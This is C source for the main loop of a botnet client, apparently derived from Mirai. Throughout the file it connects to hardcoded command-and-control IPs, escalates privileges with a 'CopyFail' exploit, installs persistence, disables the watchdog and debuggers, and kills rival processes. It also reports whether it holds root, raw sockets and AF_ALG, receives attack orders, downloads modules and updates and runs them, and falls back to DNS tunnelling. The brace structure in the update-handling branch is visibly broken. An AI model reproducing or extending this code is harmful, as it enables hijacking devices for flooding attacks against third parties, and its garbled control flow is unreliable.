#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#ifdef NP_TELNET
#include "scanner.h"
#include "exploit_scanner.h"
#include "huawei.h"
#include "thinkphp.h"
#include "zyxel_scanner.h"
#include "gpon80_scanner.h"
#include "gpon8080_scanner.h"
#endif
#include "util.h"
#include "util_userns.h"
#include "proto.h"
#include "polymorphic.h"
#include "update.h"
#include "module.h"
#include "antidebug.h"
#include "exploit_copyfail.h"
#include "persist.h"
#include "dns_tunnel.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);

#ifndef NP_INSTANCE_PORT
#define NP_INSTANCE_PORT 13324
#endif
#define SINGLE_INSTANCE_PORT (NP_INSTANCE_PORT)

ipv4_t LOCAL_ADDR;
struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
static int cnc_idx = 0;
static int tcp_failures = 0;
static char id_buf[32];

struct cnc_addr CNC_LIST[] = {
    {INET_ADDR(198,157,13,52), htons(34129)},
    {INET_ADDR(198,157,13,55), htons(34129)},
    {INET_ADDR(198,157,13,51), htons(34129)},
};

static struct handshake_ctx g_hs_ctx;
static struct update_ctx g_uctx;
static int g_in_update = 0;

static struct {
    int fd;
    uint32_t total;
    uint32_t recv;
    char name[MODULE_NAME_MAX];
    int active;
    uint8_t fallback;
} g_mctx = { -1, 0, 0, "", 0, 0 };

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("[FemboyNetwork] >> got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif

int main(int argc, char **args)
{
    int pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;
        int wfd;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);

        if ((wfd = open("/dev/watchdog", 2)) != -1 ||
            (wfd = open("/dev/misc/watchdog", 2)) != -1)
        {
            int one = 1;
            ioctl(wfd, 0x80045704, &one);
            close(wfd);
        }
        chdir("/");
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();

    anti_gdb_entry(0);
    anti_debug_check();

    util_privilege_try(argc, args);

    // if still not root, try CopyFail exploit
    if (geteuid() != 0) {
        exploit_run();
    }

    // if root, try to install persistence
    if (geteuid() == 0) {
        persist_run();
    }

    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    attack_init();
    killer_init();

    resolve_func = resolve_cnc_addr;
    resolve_cnc_addr();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    sleep(10);

    // random jitter before first connect (0-30s) to avoid thundering herd
    {
        unsigned int jitter = rand_next() % 31;
        sleep(jitter);
    }

    {
        int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
        if (oom_fd >= 0) {
            const char oom_val[] = "-1000";
            write(oom_fd, oom_val, sizeof(oom_val) - 1);
            close(oom_fd);
        }
    }

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();

        if (fd_serv >= 0) {
            if (pending_connection)
                FD_SET(fd_serv, &fdsetwr);
            else
                FD_SET(fd_serv, &fdsetrd);
        }

        mfd = (fd_ctrl > fd_serv) ? fd_ctrl : fd_serv;
        if (mfd < 0)
            mfd = 0;

        timeo.tv_usec = 0;
        timeo.tv_sec = (fd_serv == -1 || pending_connection) ? 15 : 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
            continue;

        if (nfds > 0 && fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof(cli_addr);
            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef NP_TELNET
            scanner_kill();
            exploit_scanner_kill();
            huawei_kill();
            thinkphp_kill();
            zyxel_scanner_kill();
            gpon80_scanner_kill();
            gpon8080_scanner_kill();
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }

        if (nfds == 0 && fd_serv >= 0 && !pending_connection)
        {
            uint16_t len = 0;
            if (pings++ % 6 == 0) {
                if (send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL) <= 0)
                    teardown_connection();
            }
        }

        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);
                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
                    close(fd_serv);
                    fd_serv = -1;
                    teardown_connection();
                    sleep((rand_next() % 5) + 2);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);
                    uint8_t hs[256];
                    int hs_len = 4 + id_len;

                    LOCAL_ADDR = util_local_addr();
                    hs[0] = (PROTO_MAGIC_BOT >> 8) & 0xFF;
                    hs[1] = PROTO_MAGIC_BOT & 0xFF;
                    hs[2] = 1;
                    hs[3] = id_len;
                    if (id_len > 0)
                        util_memcpy(hs + 4, id_buf, id_len);
                    proto_encrypt(hs, hs_len);
                    send(fd_serv, hs, hs_len, MSG_NOSIGNAL);

                    // polymorphic handshake after magic
                    int hr = polymorphic_handshake(fd_serv, &g_hs_ctx, proto_get_shared_secret());
                    if (hr != 0) {
                        g_hs_ctx.valid = 0;
                    } else {
                        // handshake ok — send version + module list
                        char modbuf[256];
                        module_list(modbuf, sizeof(modbuf));

                        // build capabilities string
                        char caps[64];
                        int caps_len = 0;
                        caps[0] = '\0';
                        if (geteuid() == 0)
                            caps_len += util_strcpy(caps + caps_len, "root,");
                        else
                            caps_len += util_strcpy(caps + caps_len, "nroot,");

                        // check raw socket capability
                        {
                            int test_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
                            if (test_fd >= 0) {
                                caps_len += util_strcpy(caps + caps_len, "raw,");
                                close(test_fd);
                            } else {
                                caps_len += util_strcpy(caps + caps_len, "nraw,");
                            }
                        }

                        // check AF_ALG capability (for CopyFail exploit)
                        {
                            int test_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
                            if (test_fd >= 0) {
                                caps_len += util_strcpy(caps + caps_len, "afalg,");
                                close(test_fd);
                            }
                        }

                        char info[512];
                        int il = util_strlen(BOT_VERSION);
                        int ml = util_strlen(modbuf);
                        util_memcpy(info, BOT_VERSION, il);
                        info[il] = '\0';
                        if (ml > 0) {
                            info[il + 1] = ',';
                            util_memcpy(info + il + 2, modbuf, ml);
                            info[il + 2 + ml] = '\0';
                        }
                        int info_len = util_strlen(info);

                        // append \0 caps
                        info[info_len] = '\0';
                        info_len++;
                        util_memcpy(info + info_len, caps, caps_len + 1);
                        info_len += caps_len;

                        polymorphic_send(fd_serv, &g_hs_ctx, PKT_TYPE_MODULE_LIST, 0,
                                         (uint8_t *)info, info_len);
                    }
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len = 0;
            char rdbuf[4096 + 32];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
                teardown_connection();
                sleep(rand_next() % 21);
                continue;
            }

            if (len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
                teardown_connection();
                sleep(rand_next() % 21);
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            if (n > 0)
            {
                if (g_hs_ctx.valid)
                {
                    uint8_t pkt_type, pkt_bitmap;
                    uint32_t pkt_len = n;

                    int pr = polymorphic_recv_inplace(&g_hs_ctx, &pkt_type, &pkt_bitmap,
                                                       (uint8_t *)rdbuf, &pkt_len);
                    if (pr < 0)
                    {
                        // polymorphic parse failed, fallback
                        proto_decrypt((uint8_t *)rdbuf, n);
                        attack_parse(rdbuf, n);
                    }
                    else if (pkt_type == PKT_TYPE_ATTACK)
                    {
                        attack_parse(rdbuf, pkt_len);
                    }
                    else if (pkt_type == PKT_TYPE_UPDATE)
                    {
                        if (!g_in_update)
                        {
                            if (pkt_len >= 5)
                            {
                                uint32_t total_size = ((uint32_t)rdbuf[0] << 24) |
                                                      ((uint32_t)rdbuf[1] << 16) |
                                                      ((uint32_t)rdbuf[2] << 8) |
                                                      rdbuf[3];
                                if (update_init(&g_uctx, total_size) >= 0)
                                {
                                    g_in_update = 1;
                                    update_write(&g_uctx, (uint8_t *)rdbuf + 4, pkt_len - 4);
                                }
                        }
                    }
                    else if (pkt_type == PKT_TYPE_MODULE_UNLOAD)
                    {
                        if (pkt_len > 0 && pkt_len < MODULE_NAME_MAX)
                        {
                            char mname[MODULE_NAME_MAX];
                            util_memcpy(mname, rdbuf, pkt_len);
                            mname[pkt_len] = '\0';
                            module_unload(mname);
                        }
                    }
                    else if (pkt_type == PKT_TYPE_VERSION_WARN)
                    {
                        // CNC warned us about outdated version
                        // pkt_len is the warn message string
                        if (pkt_len > 0 && pkt_len < 256)
                        {
                            char warnbuf[256];
                            util_memcpy(warnbuf, rdbuf, pkt_len);
                            warnbuf[pkt_len] = '\0';
                            // log via syslog if possible, else ignore
                        }
                    }
                    else
                        {
                            update_write(&g_uctx, (uint8_t *)rdbuf, pkt_len);
                        }
                    }
                    else if (pkt_type == PKT_TYPE_UPDATE_DONE)
                    {
                        if (g_in_update)
                        {
                            update_execute(&g_uctx);
                            update_close_clean(&g_uctx);
                            g_in_update = 0;
                        }
                    }
                    else if (pkt_type == PKT_TYPE_MODULE)
                    {
                        if (!g_mctx.active)
                        {
                            if (pkt_len < 1)
                                continue;
                            uint8_t nlen = rdbuf[0];
                            if (nlen >= MODULE_NAME_MAX || (uint32_t)(1 + nlen) >= pkt_len)
                                continue;
                            util_memcpy(g_mctx.name, rdbuf + 1, nlen);
                            g_mctx.name[nlen] = '\0';
                            g_mctx.fd = syscall(__NR_memfd_create, ".fnbmod", 0);
                            if (g_mctx.fd < 0) {
                                g_mctx.fd = open("/tmp/.fnbmod", O_WRONLY | O_CREAT | O_TRUNC, 0755);
                                g_mctx.fallback = 1;
                            }
                            if (g_mctx.fd < 0) {
                                g_mctx.active = 0;
                                continue;
                            }
                            g_mctx.active = 1;
                            g_mctx.recv = 0;
                            g_mctx.total = 0;
                            write(g_mctx.fd, rdbuf + 1 + nlen, pkt_len - 1 - nlen);
                            g_mctx.recv += pkt_len - 1 - nlen;
                        }
                        else
                        {
                            write(g_mctx.fd, rdbuf, pkt_len);
                            g_mctx.recv += pkt_len;
                        }
                    }
                    else if (pkt_type == PKT_TYPE_MODULE_DONE)
                    {
                        if (g_mctx.active)
                        {
                            module_load_fd(g_mctx.fd, g_mctx.name);
                            close(g_mctx.fd);
                            if (g_mctx.fallback)
                                unlink("/tmp/.fnbmod");
                            g_mctx.active = 0;
                        }
                    }
                    else if (pkt_type == PKT_TYPE_MODULE_LIST)
                    {
                        char modbuf[256];
                        module_list(modbuf, sizeof(modbuf));
                        char info[384];
                        int il = util_strlen(BOT_VERSION);
                        int ml = util_strlen(modbuf);
                        util_memcpy(info, BOT_VERSION, il);
                        info[il] = '\0';
                        if (ml > 0) {
                            info[il + 1] = ',';
                            util_memcpy(info + il + 2, modbuf, ml);
                            polymorphic_send(fd_serv, &g_hs_ctx, PKT_TYPE_MODULE_LIST, 0,
                                             (uint8_t *)info, il + 2 + ml);
                        } else {
                            polymorphic_send(fd_serv, &g_hs_ctx, PKT_TYPE_MODULE_LIST, 0,
                                             (uint8_t *)info, il + 1);
                        }
                    }
                    else
                    {
                        proto_decrypt((uint8_t *)rdbuf, n);
                        attack_parse(rdbuf, n);
                    }
                }
            }
        }
    }
    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct cnc_addr *target = &CNC_LIST[cnc_idx % CNC_LIST_SIZE];
    srv_addr.sin_addr.s_addr = target->ip;
    srv_addr.sin_port = target->port;
}

static void establish_connection(void)
{
    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    g_hs_ctx.valid = 0;
    if (g_in_update) {
        update_close_clean(&g_uctx);
        g_in_update = 0;
    }
    // cycle to next CNC on reconnect
    cnc_idx = (cnc_idx + 1) % CNC_LIST_SIZE;
    tcp_failures++;

    // after too many failures, try DNS tunnel
    if (tcp_failures >= CNC_LIST_SIZE * 4 && id_buf[0] != '\0') {
        tcp_failures = 0;
        // try DNS tunnel with the first CNC IP
        uint32_t dns_ip = CNC_LIST[0].ip;
        int dns_ret = dns_main_loop(dns_ip, id_buf);
        if (dns_ret < 0) {
            // DNS tunnel failed too — wait 5 minutes and restart process
            sleep(300);
            char self[256];
            int slen = readlink("/proc/self/exe", self, sizeof(self) - 1);
            if (slen > 0) {
                self[slen] = '\0';
                char *argv[] = {self, id_buf, NULL};
                execve(self, argv, NULL);
            }
        }
    }
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    static int retry_count = 0;
    struct sockaddr_in addr;
    int opt = 1;

    if (retry_count++ > 48) {
        retry_count = 0;
        fd_ctrl = -1;
        return;
    }

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind) {
            local_bind = FALSE;
            addr.sin_addr.s_addr = INADDR_ANY;
            if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == 0)
                goto listen_ok;
        }
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) { }

        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance();
        return;
    }
listen_ok:
    if (listen(fd_ctrl, 1) == -1)
    {
        close(fd_ctrl);
        sleep(5);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance();
        return;
    }
    retry_count = 0;
}
